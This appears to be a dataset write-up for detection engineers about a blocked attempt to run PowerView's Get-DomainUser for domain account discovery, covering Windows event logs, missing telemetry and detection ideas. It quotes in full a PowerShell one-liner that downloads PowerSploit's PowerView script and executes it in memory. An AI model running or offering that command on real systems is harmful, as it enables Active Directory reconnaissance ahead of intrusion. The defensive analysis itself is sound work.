# T1087.002-11: Domain Account — Get-DomainUser with PowerView

## Technique Context

T1087.002 (Account Discovery: Domain Account) involves adversaries enumerating domain user accounts to understand the Active Directory environment and identify high-value targets. PowerView's `Get-DomainUser` function is a popular PowerShell-based tool for this purpose, allowing attackers to query domain controllers for comprehensive user information including group memberships, account properties, and privilege levels. This technique is fundamental to Active Directory reconnaissance and is frequently observed in post-exploitation phases where attackers map the domain structure before lateral movement or privilege escalation attempts.

The detection community focuses on monitoring PowerShell execution with suspicious parameters, network connections to domain controllers on LDAP ports, and the loading of PowerView modules. However, legitimate administrative tools and scripts can generate similar telemetry, making context and behavioral analysis crucial for accurate detection.

## What This Dataset Contains

This dataset captures an attempt to download and execute PowerView's `Get-DomainUser` function, but Windows Defender blocked the execution. The key evidence includes:

**Security Event 4688** shows the PowerShell process creation with the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose}` (PID 43080).

**Security Event 4689** shows the PowerShell process exited with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Sysmon Event 7** captures multiple DLL loads including Windows Defender components (`MpOAV.dll`, `MpClient.dll`) and the `urlmon.dll` indicating preparation for web requests.

**Sysmon Event 1** shows creation of `whoami.exe` (PID 42252) spawned by the PowerShell process, likely part of the test setup rather than the actual technique.

**PowerShell Events 4103/4104** contain only boilerplate `Set-ExecutionPolicy` and `Set-StrictMode` commands from the test framework.

## What This Dataset Does Not Contain

This dataset lacks the actual PowerView execution telemetry because Windows Defender successfully blocked the script download and execution. Missing elements include:

- No PowerShell script block logging (4104) of the actual PowerView.ps1 content
- No LDAP queries to domain controllers that would result from successful `Get-DomainUser` execution
- No Sysmon network connections (Event 3) to the PowerSploit GitHub repository or domain controllers
- No domain user enumeration results in PowerShell transcription logs
- No registry modifications typically associated with PowerView execution

The exit code `0xC0000022` confirms that Defender's real-time protection prevented the technique from completing, providing attempt evidence but not execution evidence.

## Assessment

This dataset provides moderate value for detection engineering focused on PowerView download attempts rather than successful execution. The Security channel's process creation events with full command-line logging capture the most valuable detection artifacts - the explicit PowerSploit URL and `Get-DomainUser` function call. However, the dataset's utility is limited for understanding successful PowerView execution patterns or the network/authentication behaviors that follow.

The Sysmon configuration's include-mode filtering explains why we don't see ProcessCreate events for the PowerShell processes, but Security 4688 events provide comprehensive coverage. The Windows Defender blocking demonstrates how modern endpoint protection affects both attack success and available telemetry.

## Detection Opportunities Present in This Data

1. **PowerSploit Download Detection** - Monitor Security 4688 for PowerShell command lines containing `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/` or similar known offensive frameworks URLs.

2. **PowerView Function Detection** - Alert on command lines containing `Get-DomainUser`, `Get-DomainGroup`, or other PowerView-specific cmdlets, especially when combined with web download patterns.

3. **Defender Block Correlation** - Correlate process creation events with exit code `0xC0000022` to identify blocked malicious PowerShell executions that warrant investigation.

4. **PowerShell Network Preparation** - Monitor Sysmon 7 events for `urlmon.dll` loads by PowerShell processes, indicating preparation for web requests that may download offensive tools.

5. **Suspicious PowerShell Patterns** - Create behavioral rules for PowerShell processes that load networking DLLs, set TLS protocols, and attempt to invoke expressions from web sources in rapid succession.

6. **Command Line Obfuscation Bypass** - Detect the `IEX (IWR` pattern which bypasses some basic PowerShell download blocking by using aliases for `Invoke-Expression` and `Invoke-WebRequest`.
